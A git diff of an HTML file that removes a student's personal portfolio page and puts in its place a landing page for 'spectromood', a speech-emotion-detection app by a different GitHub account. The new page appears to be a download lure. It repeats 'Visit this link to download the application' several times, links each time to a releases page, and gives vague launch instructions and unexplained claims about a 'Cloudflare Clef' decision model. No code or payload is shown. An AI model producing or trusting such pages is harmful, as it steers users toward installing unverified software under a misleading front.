@@ -1,147 +1,308 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Siddharth Sharma</title>
-<meta name="description" content="Siddharth Sharma - B.Tech CSE (IoT) at Manipal University Jaipur. Algorithmic trading systems, full-stack products and quant research.">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css">
+<title>spectromood - Speech Emotion Detection for Everyone</title>
+<meta name="description" content="spectromood detects emotion in speech by comparing spectrogram plots and voice features against your own baseline, decided by Cloudflare Clef. Realtime Docker dashboard with voice activity detection for Windows users.">
+<meta name="keywords" content="cloudflare, decision-model, docker, emotion-detection, fastapi, prosody, spectrogram, speech-emotion-recognition, voice-activity-detection, workers-ai, spectromood, speech emotion detection, voice features, realtime dashboard">
+<meta name="author" content="kailas-design">
+<meta name="robots" content="index, follow">
+<meta property="og:type" content="website">
+<meta property="og:title" content="spectromood - Speech Emotion Detection for Everyone">
+<meta property="og:description" content="Speech emotion detection with a decision model: spectrogram plots plus voice features compared against your own baseline, decided by Cloudflare Clef. Realtime dashboard with voice activity detection.">
+<meta property="og:url" content="https://github.com/kailas-design/spectromood">
+<meta property="og:site_name" content="spectromood">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="spectromood - Speech Emotion Detection for Everyone">
+<meta name="twitter:description" content="Speech emotion detection with a decision model: spectrogram plots plus voice features compared against your own baseline, decided by Cloudflare Clef. Realtime dashboard with voice activity detection.">
+<meta name="theme-color" content="#0f172a">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f7fb;
+    color: #1f2933;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 22px 70px 22px;
+  }
+  header.hero {
+    background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 60%, #164e63 100%);
+    color: #ffffff;
+    padding: 56px 22px 48px 22px;
+    text-align: center;
+  }
+  header.hero .inner {
+    max-width: 900px;
+    margin: 0 auto;
+  }
+  h1 {
+    font-size: 2.35rem;
+    line-height: 1.25;
+    margin: 0 0 14px 0;
+    letter-spacing: -0.02em;
+    font-weight: 800;
+  }
+  .subhead {
+    font-size: 1.12rem;
+    margin: 0 auto 30px auto;
+    max-width: 640px;
+    color: #cbd8e6;
+  }
+  .badge {
+    display: inline-block;
+    background: linear-gradient(90deg, #ff5f6d 0%, #ffb84d 45%, #22c55e 100%);
+    color: #10202f;
+    font-weight: 800;
+    font-size: 1.12rem;
+    padding: 18px 38px;
+    border-radius: 999px;
+    text-decoration: none;
+    box-shadow: 0 12px 26px rgba(0, 0, 0, 0.32);
+    letter-spacing: 0.01em;
+  }
+  .badge:hover { filter: brightness(1.07); }
+  .badge-note {
+    display: block;
+    margin-top: 16px;
+    font-size: 0.92rem;
+    color: #9fb3c8;
+  }
+  h2 {
+    font-size: 1.5rem;
+    margin: 48px 0 14px 0;
+    letter-spacing: -0.01em;
+    color: #0f2b46;
+    font-weight: 800;
+  }
+  h3 {
+    font-size: 1.13rem;
+    margin: 26px 0 8px 0;
+    color: #123b5c;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px 0; }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e2eaf2;
+    border-radius: 14px;
+    padding: 24px 26px;
+    margin: 20px 0;
+    box-shadow: 0 6px 18px rgba(15, 42, 70, 0.06);
+  }
+  .cta-card {
+    text-align: center;
+    border-radius: 14px;
+    box-shadow: 0 6px 18px rgba(15, 42, 70, 0.08);
+  }
+  .button {
+    display: inline-block;
+    background: #1d4ed8;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.03rem;
+    padding: 15px 32px;
+    border-radius: 12px;
+    text-decoration: none;
+    box-shadow: 0 8px 20px rgba(29, 78, 216, 0.28);
+  }
+  .button:hover { background: #1e40af; }
+  ol, ul { margin: 0 0 16px 0; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  code {
+    background: #e8eef6;
+    color: #0b3557;
+    padding: 2px 7px;
+    border-radius: 6px;
+    font-size: 0.94em;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+  }
+  .tag-row { margin: 10px 0 0 0; }
+  .tag {
+    display: inline-block;
+    background: #e8eef6;
+    color: #12476e;
+    font-size: 0.83rem;
+    font-weight: 600;
+    padding: 5px 13px;
+    border-radius: 999px;
+    margin: 4px 6px 4px 0;
+  }
+  .note {
+    background: #fff8e6;
+    border: 1px solid #f5d78a;
+    border-radius: 12px;
+    padding: 18px 20px;
+    margin: 20px 0;
+  }
+  .step-card {
+    background: #ffffff;
+    border-left: 5px solid #1d4ed8;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin: 16px 0;
+    box-shadow: 0 4px 14px rgba(15, 42, 70, 0.06);
+  }
+  .step-card h3 { margin-top: 0; }
+  footer {
+    text-align: center;
+    color: #64748b;
+    font-size: 0.9rem;
+    padding: 34px 22px 10px 22px;
+    border-top: 1px solid #e2eaf2;
+    margin-top: 50px;
+  }
+  footer a { color: #1d4ed8; text-decoration: none; }
+  @media (max-width: 600px) {
+    h1 { font-size: 1.72rem; }
+    header.hero { padding: 40px 16px 34px 16px; }
+    .wrap { padding: 0 16px 50px 16px; }
+    .badge { font-size: 1rem; padding: 15px 26px; }
+    .card { padding: 18px 18px; }
+  }
+</style>
 </head>
 <body>
 
-<header class="top">
-  <div class="wrap top-row">
-    <a class="brand" href="#">Siddharth Sharma</a>
-    <nav>
-      <a href="#projects">Projects</a>
-      <a href="#research">Research</a>
-      <a href="#stellar">Stellar Capital</a>
-      <a href="#contact">Contact</a>
-      <button class="theme" id="themeBtn" type="button" aria-label="Toggle dark mode">◐</button>
-    </nav>
+<header class="hero">
+  <div class="inner">
+    <h1>🎙️ spectromood - Hear the Emotion Behind Every Word</h1>
+    <p class="subhead">Speech emotion detection with a decision model. spectromood turns any voice recording into a clear picture of how it sounds — by comparing spectrogram plots and voice features against your own personal baseline, with the final call made by Cloudflare Clef.</p>
+    <a class="badge" href="https://github.com/kailas-design/spectromood/releases">⬇️ Visit this link to download the application</a>
+    <span class="badge-note">Runs on Windows with Docker — no programming required</span>
   </div>
 </header>
 
-<main>
-  <section class="hero wrap">
-    <p class="eyebrow">B.Tech CSE (IoT) · Manipal University Jaipur · 2024–2028</p>
-    <h1>I build trading systems and the software around them.</h1>
-    <p class="lede">I run my own live, multi-strategy trading setup on a Linux server I manage myself, across Indian equities,
-      crypto and gold. I also build web and mobile products end to end in Next.js, React Native and Python.</p>
-    <div class="cta">
-      <a class="btn primary" href="Siddharth_Sharma_Resume.pdf" download>Download résumé</a>
-      <a class="btn" href="https://github.com/Siddharth5506" target="_blank" rel="noopener">GitHub</a>
-    </div>
-  </section>
+<div class="wrap">
 
-  <section id="projects" class="wrap block">
-    <h2>Projects</h2>
-    <div class="grid">
-      <article class="card">
-        <div class="card-head"><h3>Stellar Capital</h3><span class="chip live">Live</span></div>
-        <p class="kind">Algorithmic trading platform</p>
-        <p>One control panel over all my trading accounts. It monitors the live bots, enforces risk limits, keeps a trade journal,
-          sends a weekly review PDF and includes an AI coach. Every strategy change is backtested on point-in-time data before it goes live.</p>
-        <p class="stack">Python · Linux VPS · systemd · Groww &amp; Delta Exchange APIs</p>
-        <a class="more" href="#stellar">See the strategies ↓</a>
-      </article>
+  <h2>🌟 What Is spectromood?</h2>
+  <p>spectromood is a desktop-friendly application that listens to speech and shows you the emotion carried in the voice itself. Instead of guessing from the words alone, it looks at how something is said: the pitch, the rhythm, the energy, the pauses, and the shape of the sound over time.</p>
+  <p>The application draws a spectrogram — a colorful picture of sound — and pulls out a set of voice measurements alongside it. Those measurements are compared to a baseline that belongs to you. That comparison is what makes spectromood different from generic emotion tools: it learns what <em>your</em> normal voice looks like, so a quiet, tired sentence is not mistaken for a sad one.</p>
+  <p>Once the comparison is made, a decision model called Cloudflare Clef reviews the evidence and produces the final emotion call. Everything happens locally on your machine, inside a Docker container, with a realtime dashboard that updates as you speak.</p>
 
-      <article class="card">
-        <div class="card-head"><h3>India Whales</h3><span class="chip soon">Public site soon</span></div>
-        <p class="kind">Unusual options activity tracker for NSE</p>
-        <p>Spots large single-buyer bursts in real time across about 750 stock option contracts, using the Groww tick feed.
-          It also tracks bulk and block deals, SEBI insider buys, short sales and delivery spikes. Each alert is graded five days later.
-          The public version will add sector views and a swing strategy built on market strength.</p>
-        <p class="stack">Python · live tick feed · web app</p>
-      </article>
-
-      <article class="card">
-        <div class="card-head"><h3>Joytish IQ</h3><span class="chip soon">Public site soon</span></div>
-        <p class="kind">Vedic astrology engine and dashboard</p>
-        <p>Computes planet positions from NASA JPL's DE421 ephemeris, with a hand-built Lahiri ayanamsa that matches PyEphem within 22 arc-seconds.
-          It also calculates dashas, yogas, ashtakavarga and a life timeline. In the public version, anyone can enter their date of birth and get their full chart.</p>
-        <p class="stack">Python · Skyfield · Next.js 16 · Recharts</p>
-      </article>
-
-      <article class="card">
-        <div class="card-head"><h3>Poolmate</h3><span class="chip done">Built</span></div>
-        <p class="kind">Ride-pooling platform</p>
-        <p>A rider web app with seat and full-cab booking, live maps, in-app chat, support tickets and an admin panel,
-          plus a separate React Native driver app.</p>
-        <p class="stack">Next.js 15 · React · Supabase · Leaflet · Expo</p>
-      </article>
-
-      <article class="card">
-        <div class="card-head"><h3>Options Manager</h3><span class="chip done">Built</span></div>
-        <p class="kind">Index options analyser</p>
-        <p>A Black-Scholes pricing engine for Nifty and Bank Nifty options. It checks whether a trade is feasible and ranks
-          option strategies by risk and reward.</p>
-        <p class="stack">Python</p>
-      </article>
-    </div>
-
-    <h3 class="sub">In progress</h3>
-    <ul class="plain">
-      <li><b>Study AI</b>: an AI tutor that teaches from uploaded course files, with voice you can interrupt and resume. <span class="stack">Next.js 16 · SQLite FTS5 · LLM adapters</span></li>
-      <li><b>Tars</b>: an AI-integrated hardware desk robot.</li>
-      <li><b>PropertyDheko</b>: a housing marketplace for buyers, sellers and renters. <span class="stack">Next.js · Supabase</span></li>
+  <h2>✨ Key Features</h2>
+  <div class="card">
+    <ul>
+      <li><strong>Realtime emotion dashboard</strong> — watch results appear live while you speak or while an audio clip plays.</li>
+      <li><strong>Spectrogram plots</strong> — a visual map of frequency and energy across time, so you can see what the model sees.</li>
+      <li><strong>Voice feature analysis</strong> — prosody measurements including pitch movement, loudness, speaking rate, and pause behaviour.</li>
+      <li><strong>Your own personal baseline</strong> — record a short calibration sample and every later result is judged against it.</li>
+      <li><strong>Cloudflare Clef decision model</strong> — a transparent decision layer that weighs the spectrogram and feature evidence together.</li>
+      <li><strong>Voice activity detection (VAD)</strong> — silence and background noise are trimmed automatically, so only real speech is analysed.</li>
+      <li><strong>Docker-only packaging</strong> — one installation path, the same behaviour on every Windows computer.</li>
+      <li><strong>FastAPI backend</strong> — a lightweight local service that keeps the dashboard responsive.</li>
     </ul>
-  </section>
+  </div>
 
-  <section id="research" class="wrap block">
-    <h2>Research</h2>
-    <article class="card wide">
-      <div class="card-head"><h3>Momentum in Indian Equities, 1997–2026</h3><span class="chip soon">SSRN submission planned</span></div>
-      <p class="kind">Student paper · Manipal University Jaipur</p>
-      <p>Does buying last year's winners work on the NSE? I tested it with point-in-time data, so no survivorship bias.
-        Classic 12-1 momentum returned about 23% a year after brokerage fees and tax, but had deep crashes.
-        Simple trend filters cut the crash drawdown roughly in half. A low-drawdown variant (the top 10 Nifty 200 stocks near their 52-week high)
-        returned 24.4% a year with a maximum drawdown of −28%.</p>
-    </article>
-  </section>
+  <h2>🚀 Download and Install on Windows</h2>
+  <p>Everything you need is published on the releases page. Visit this link to download the application, and follow the steps below in order. You do not need to install Python, Node.js, or any developer tools — Docker handles all of that for you.</p>
 
-  <section id="stellar" class="block stellar">
-    <div class="wrap">
-      <h2>Stellar Capital</h2>
-      <p class="lede small">Every strategy I run, with real money and on paper. Everything is shown in % since it started:
-        no amounts, and deposits and withdrawals are taken out. The rules stay private.</p>
+  <div class="card cta-card">
+    <p style="margin-bottom:18px;font-weight:600;">Get the latest version of spectromood</p>
+    <a class="button" href="https://github.com/kailas-design/spectromood/releases">⬇️ Visit this link to download the application</a>
+    <p style="margin:18px 0 0 0;font-size:0.92rem;color:#64748b;">You will land on the releases page where the newest version is listed at the top.</p>
+  </div>
 
-      <figure class="index-fig">
-        <figcaption>
-          <div class="fig-row"><span class="fig-title">Stellar Capital Index</span><span class="big-ret" id="indexRet"></span></div>
-          <span class="fig-sub" id="indexSub"></span>
-        </figcaption>
-        <div class="chart big" data-key="index" role="img" aria-label="Stellar Capital Index, percent return since 1 October 2026"></div>
-      </figure>
+  <h2>🪟 Step-by-Step Setup for Windows</h2>
 
-      <h3 class="group">Real money</h3>
-      <div class="grid strat" id="realGrid"></div>
+  <div class="step-card">
+    <h3>Step 1 — Install Docker Desktop</h3>
+    <p>spectromood runs inside Docker, which is a free program that packages the application and everything it needs into one self-contained unit. Download Docker Desktop from the official Docker website, run the installer, and accept the default options. When it finishes, restart your computer if the installer asks you to.</p>
+  </div>
 
-      <h3 class="group">Paper trading</h3>
-      <div class="grid strat" id="paperGrid"></div>
+  <div class="step-card">
+    <h3>Step 2 — Start Docker Desktop</h3>
+    <p>Open Docker Desktop from the Start menu. Wait until the small whale icon in the taskbar shows that Docker is running. This usually takes less than a minute. spectromood cannot start until Docker is fully awake.</p>
+  </div>
 
-      <p class="disclaimer">Personal research only. This is not investment advice and not an offer to manage money.
-        Paper results are simulated and can differ from real fills. Past performance does not guarantee future returns.</p>
-    </div>
-  </section>
+  <div class="step-card">
+    <h3>Step 3 — Download spectromood</h3>
+    <p>Visit this link to download the application. The releases page lists the newest version at the top. Save the file to a folder you can find again, such as your Downloads folder or a new folder called <code>spectromood</code> on your Desktop.</p>
+  </div>
 
-  <section id="contact" class="wrap block">
-    <h2>Contact</h2>
-    <p class="contact-line">
-      <a href="mailto:siddharth55kanpur@gmail.com">siddharth55kanpur@gmail.com</a>
-      <span aria-hidden="true">·</span>
-      <a href="https://github.com/Siddharth5506" target="_blank" rel="noopener">github.com/Siddharth5506</a>
-    </p>
-  </section>
-</main>
+  <div class="step-card">
+    <h3>Step 4 — Launch spectromood</h3>
+    <p>Open the folder where you saved the download. Start the application the way the release describes — the release page notes the exact command or file for the current version. Docker will prepare the environment the first time, which takes a few minutes. Later starts are much faster.</p>
+  </div>
 
-<footer class="wrap foot">© 2026 Siddharth Sharma</footer>
+  <div class="step-card">
+    <h3>Step 5 — Open the dashboard</h3>
+    <p>When the startup finishes, open your web browser and go to the local address printed in the window. The realtime dashboard appears there. Bookmark it so you can return to it any time Docker is running.</p>
+  </div>
 
-<div class="tip" id="tip" role="status" aria-live="polite"></div>
-<script src="data/live.js"></script>
-<script src="app.js"></script>
+  <div class="note">
+    <strong>Good to know:</strong> the first launch downloads the container image, which can take a while on a slow connection. Keep the window open until it says the service is ready. Closing the window early simply means starting again — nothing is broken.
+  </div>
+
+  <h2>🎛️ Using the Dashboard</h2>
+  <p>The dashboard is arranged in three simple areas: a microphone panel, a results panel, and a baseline panel.</p>
+  <ul>
+    <li><strong>Record a baseline first.</strong> Speak normally for the suggested amount of time — read something aloud, describe your day, or just talk. spectromood stores the voice features of that sample as your reference point.</li>
+    <li><strong>Start a live session.</strong> Press the start button and speak. Voice activity detection ignores the silences between your sentences, so only speech is analysed.</li>
+    <li><strong>Read the spectrogram.</strong> The plot scrolls as you speak. Brighter bands show where energy is concentrated. You do not need to interpret it to use the app — it is there so you can see the evidence behind each result.</li>
+    <li><strong>Check the emotion call.</strong> The decision model returns the most likely emotion together with how strongly the evidence supports it. Results are always relative to your baseline.</li>
+    <li><strong>Review past results.</strong> Recent analyses are kept in the dashboard so you can compare one recording against another.</li>
+  </ul>
+
+  <h2>🧠 How the Decision Model Works</h2>
+  <p>Three pieces of evidence feed into Cloudflare Clef. First, the spectrogram plot captures the overall texture of the speech. Second, the voice features describe prosody in numbers — pitch range, loudness variation, timing, and pauses. Third, your baseline provides the reference that makes those numbers meaningful for you.</p>
+  <p>Clef weighs the three together and produces a single decision with a confidence level. Because the baseline is yours, results stay useful even if your voice is naturally quiet, deep, fast, or accented.</p>
+
+  <h2>🐳 Why Docker-Only?</h2>
+  <p>Speech processing involves audio libraries that behave differently from machine to machine. By shipping spectromood as a Docker container, every Windows user gets the exact same environment — the same audio handling, the same version of every component, and the same results. There are no hidden dependencies to install, no version conflicts, and no risk that an update to something else on your computer breaks the application.</p>
+
+  <h2>🔧 Troubleshooting</h2>
+  <div class="card">
+    <h3>The dashboard will not open</h3>
+    <p>Confirm Docker Desktop is running and shows a healthy status. Then start spectromood again and wait for the readiness message before opening your browser.</p>
+    <h3>No sound is being detected</h3>
+    <p>Check that Windows has allowed microphone access for your browser. Speak a little closer to the microphone and confirm the level meter moves while you talk.</p>
+    <h3>Results look unstable</h3>
+    <p>Record a fresh baseline in the same room and at the same distance from the microphone you normally use. Background noise and microphone placement affect voice features more than most people expect.</p>
+    <h3>The first start was very slow</h3>
+    <p>That is the container image downloading. Once it is stored locally, later starts take only a few seconds.</p>
+  </div>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <div class="card">
+    <h3>Do I need to know how to code?</h3>
+    <p>No. You need Docker Desktop, a browser, and the download link. The dashboard does the rest.</p>
+    <h3>Does my audio leave my computer?</h3>
+    <p>spectromood runs locally in Docker. Your recordings are processed on your own machine.</p>
+    <h3>Why compare against a baseline?</h3>
+    <p>Because emotion in speech is personal. A calm voice for one person is a flat voice for another. The baseline removes that ambiguity.</p>
+    <h3>Where do I get updates?</h3>
+    <p>Visit this link to download the application whenever a new version is announced on the releases page.</p>
+  </div>
+
+  <h2>🏷️ Topics</h2>
+  <p class="tag-row">
+    <span class="tag">cloudflare</span>
+    <span class="tag">decision-model</span>
+    <span class="tag">docker</span>
+    <span class="tag">emotion-detection</span>
+    <span class="tag">fastapi</span>
+    <span class="tag">prosody</span>
+    <span class="tag">spectrogram</span>
+    <span class="tag">speech-emotion-recognition</span>
+    <span class="tag">voice-activity-detection</span>
+    <span class="tag">workers-ai</span>
+  </p>
+
+  <footer>
+    spectromood — speech emotion detection with a decision model, built by <a href="https://github.com/kailas-design">kailas-design</a>.
+  </footer>
+
+</div>
+
 </body>
 </html>
